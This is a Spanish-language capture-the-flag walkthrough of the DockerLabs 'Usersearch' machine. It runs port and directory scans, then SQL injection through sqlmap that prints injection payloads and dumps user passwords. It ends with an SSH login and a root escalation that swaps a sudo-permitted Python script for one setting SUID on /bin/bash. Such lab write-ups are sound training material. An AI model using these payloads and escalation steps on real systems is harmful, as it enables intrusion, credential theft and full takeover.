---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Usersearch DockerLabs (intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip usersearch.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh usersearch.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla  
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 12:07 EST
Nmap scan report for 172.18.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 ea:6b:ef:51:9c:00:c4:d4:24:17:90:be:6d:0a:26:79 (ECDSA)
|_  256 62:97:b5:91:0c:b0:8f:06:bd:ad:e3:d5:14:3d:f1:74 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: User Search
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
```

Vemos que tiene una pagina, por lo que probaremos a hacer `fuzzing` para ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 855]
/javascript           (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que tiene una base de datos y si entramos en la pagina web, veremos un campo en el que pone para buscar a un usuario, si probamos a poner `admin` veremos lo siguiente:

```
Username: admin - Password: adminpassword
```

Pero no nos servira de mucho, probaremos si es vulnerable a `SQL injection`.

## Escalate user kvzlx

### SQLMap

Primero capturaremos la peticion con `BurpSuite` para pasarle a `sqlmap` un `request.txt`.

> request.txt

```
GET /?user=admin HTTP/1.1
Host: 172.18.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.18.0.2/?user=admin
Upgrade-Insecure-Requests: 1
```

```shell
sqlmap -r request.txt --dbs
```

Info:

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:16:21 /2024-12-09/

[12:16:21] [INFO] parsing HTTP request from 'request.txt'
[12:16:22] [INFO] testing connection to the target URL
[12:16:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:16:22] [INFO] testing if the target URL content is stable
[12:16:22] [INFO] target URL content is stable
[12:16:22] [INFO] testing if GET parameter 'user' is dynamic
[12:16:22] [INFO] GET parameter 'user' appears to be dynamic
[12:16:22] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
[12:16:22] [INFO] testing for SQL injection on GET parameter 'user'
[12:16:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:16:22] [INFO] GET parameter 'user' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="admin")
[12:16:22] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 

[12:16:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[12:16:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[12:16:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[12:16:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[12:16:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[12:16:27] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[12:16:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[12:16:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[12:16:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:16:27] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:16:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:16:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:16:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:16:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:16:27] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:16:27] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[12:16:27] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[12:16:27] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[12:16:27] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[12:16:27] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[12:16:27] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[12:16:27] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[12:16:27] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:16:27] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[12:16:27] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[12:16:27] [INFO] testing 'Generic inline queries'
[12:16:27] [INFO] testing 'MySQL inline queries'
[12:16:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[12:16:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[12:16:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[12:16:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[12:16:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[12:16:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[12:16:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:16:37] [INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[12:16:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:16:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:16:37] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:16:37] [INFO] target URL appears to have 3 columns in query
[12:16:37] [INFO] GET parameter 'user' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=admin' AND 4481=4481 AND 'VRkC'='VRkC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 3308 FROM (SELECT(SLEEP(5)))PfFo) AND 'SWcy'='SWcy

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: user=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626271,0x776c746c45426e72564b55736875677a44514d567864595251554c47746269466f766d694b446572,0x7171707871)-- -
---
[12:16:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:16:43] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] testdb

[12:16:43] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 50 times
[12:16:43] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.18.0.2'

[*] ending @ 12:16:43 /2024-12-09/
```

Por lo que vemos tendremos 2 bases de datos, probaremos con la llamada `testdb`.

```shell
sqlmap -r request.txt -D testdb --tables
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.8.7#stable}                                                                                                                     
|_ -| . [,]     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:18:15 /2024-12-09/

[12:18:15] [INFO] parsing HTTP request from 'request.txt'
[12:18:15] [INFO] resuming back-end DBMS 'mysql' 
[12:18:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=admin' AND 4481=4481 AND 'VRkC'='VRkC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 3308 FROM (SELECT(SLEEP(5)))PfFo) AND 'SWcy'='SWcy

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: user=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626271,0x776c746c45426e72564b55736875677a44514d567864595251554c47746269466f766d694b446572,0x7171707871)-- -
---
[12:18:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:18:15] [INFO] fetching tables for database: 'testdb'
Database: testdb
[1 table]
+-------+
| users |
+-------+

[12:18:15] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.18.0.2'

[*] ending @ 12:18:15 /2024-12-09/
```

Veremos ahora las columnas de la tabla `users` descubierta.

```shell
sqlmap -r request.txt -D testdb -T users --dump
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.8.7#stable}                                                                                                                     
|_ -| . [']     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:19:11 /2024-12-09/

[12:19:11] [INFO] parsing HTTP request from 'request.txt'
[12:19:11] [INFO] resuming back-end DBMS 'mysql' 
[12:19:11] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=admin' AND 4481=4481 AND 'VRkC'='VRkC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin' AND (SELECT 3308 FROM (SELECT(SLEEP(5)))PfFo) AND 'SWcy'='SWcy

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: user=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x7171626271,0x776c746c45426e72564b55736875677a44514d567864595251554c47746269466f766d694b446572,0x7171707871)-- -
---
[12:19:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:19:11] [INFO] fetching columns for table 'users' in database 'testdb'
[12:19:11] [INFO] fetching entries for table 'users' in database 'testdb'
Database: testdb
Table: users
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | adminpassword | admin    |
| 2  | user1password | user1    |
| 3  | kvzlxpassword | kvzlx    |
+----+---------------+----------+

[12:19:11] [INFO] table 'testdb.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.18.0.2/dump/testdb/users.csv'
[12:19:11] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.18.0.2'

[*] ending @ 12:19:11 /2024-12-09/
```

Y veremos varios usuarios, por lo que probaremos por `ssh` a conectarnos con alguno de ellos.

### SSH

```shell
ssh kvzlx@<IP>
```

Y si metemos la contraseña `kvzlxpassword` veremos que estaremos dentro con el usuario `kvzlx`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguientes:

```
Matching Defaults entries for kvzlx on 0629979c4225:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User kvzlx may run the following commands on 0629979c4225:
    (ALL) NOPASSWD: /usr/bin/python3 /home/kvzlx/system_info.py
```

Veremos que esta en nuestro dierctorio, por lo que podremos eliminarlo:

```shell
rm /home/kvzlx/system_info.py
```

Info:

```
rm: remove write-protected regular file 'system_info.py'? y
```

Pondremos `y` y se eliminara, por lo que crearemos el mismo archivo con el siguiente contenido:

> system\_info.py

```python
#!/bin/python3

import os

def set_suid():
    try:
        # Cambiar permisos con chmod u+s
        os.system("chmod u+s /bin/bash")
        print("[+] SUID establecido correctamente en /bin/bash.")
    except Exception as e:
        print(f"[-] Error al establecer SUID: {e}")

if __name__ == "__main__":
    print("[*] Intentando establecer SUID en /bin/bash...")
    set_suid()
```

Para establecer la `bash` con permisos `SUID`.

Lo ejecutaremos de la siguiente forma:

```shell
sudo /usr/bin/python3 /home/kvzlx/system_info.py
```

Y si hacemos un `ls -la` a la `bash`:

```
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Si hacemos:

```shell
bash -p
```

Seremos `root`, por lo que la habremos terminado.
